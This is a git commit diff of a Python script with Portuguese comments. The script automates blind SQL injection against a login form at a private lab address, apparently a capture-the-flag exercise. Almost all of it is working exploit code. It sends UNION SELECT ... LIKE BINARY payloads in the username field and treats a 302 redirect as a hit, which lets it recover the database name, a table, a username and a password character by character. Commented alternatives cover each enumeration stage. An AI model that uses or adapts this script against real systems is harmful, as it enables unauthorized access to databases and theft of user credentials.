c713afda830e0b89dd3cd342dd024c19e400dce3
ooclaar <ramonalonso@outlook.com.br>
2024-02-19 23:49:04 -0300

    Script blind-sql.py finalizado.

--- blind-sql.py
+++ blind-sql.py
@@ -6,32 +6,40 @@
 
 import requests
 
-url = "http://10.10.233.64/index.php"
+url = "http://10.10.98.149/index.php"
 
 letras="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
 payload="" # Inicie com o Payload em branco e vá adicionando as letras de acordo com que vai achando. 
 
-for letra in letras:
+while True:
 
-    data = {
-        # Modifique o comando injection de acordo com que você achou.
-        # "username": f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{payload}{letra}%' -- -", # mywebsite
-        "username:": "' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY 's%' -- -",
-        "password": "xxx"
-    }
+    for letra in letras:
 
-    # Descomente caso você queira ver a consulta.
-    # print(data)
+        data = {
+            # Descomente e modifique o comando injection de acordo com sua necessidade. O primeiro exemplo enumera o banco de dados, o segundo a tabela, o terceiro o username e o ultimo a senha.
+            # "username": f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{payload}{letra}%' -- -", # mywebsite
+            # "username": f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY '{payload}{letra}%' -- -", #siteusers
+            "username": f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE BINARY '{payload}{letra}%';-- -", #kitty
+            # "username": f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY '{payload}{letra}%';-- -",
+            "password": "xxx"
+        }
 
-    headers = {
-        # Pode ser que necessite fazer um ajuste aqui de acordo com o tipo de dado que é enviado para o servidor. 
-        # "Content-Type": "application/json"
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Cache-Control": "no-cache"
-    }
+        # Descomente caso você queira ver a consulta.
+        print(data)
 
-    response = requests.post(url, data=data, headers=headers, allow_redirects=False)
+        headers = {
+            # Pode ser que necessite fazer um ajuste aqui de acordo com o tipo de dado que é enviado para o servidor. 
+            # "Content-Type": "application/json"
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
 
-    if response.status_code == 302:
-        print(f"Letra encontrada: {letra}")
+        response = requests.post(url, data=data, headers=headers, allow_redirects=False)
+
+        if response.status_code == 302:
+            payload+=letra
+            print(f"Letra encontrada: {letra}")
+            break
+
+    if response.status_code == 200 and letra=="_":
+        print(f"Script finalizado, a payload encontrada foi: {payload}")
         break
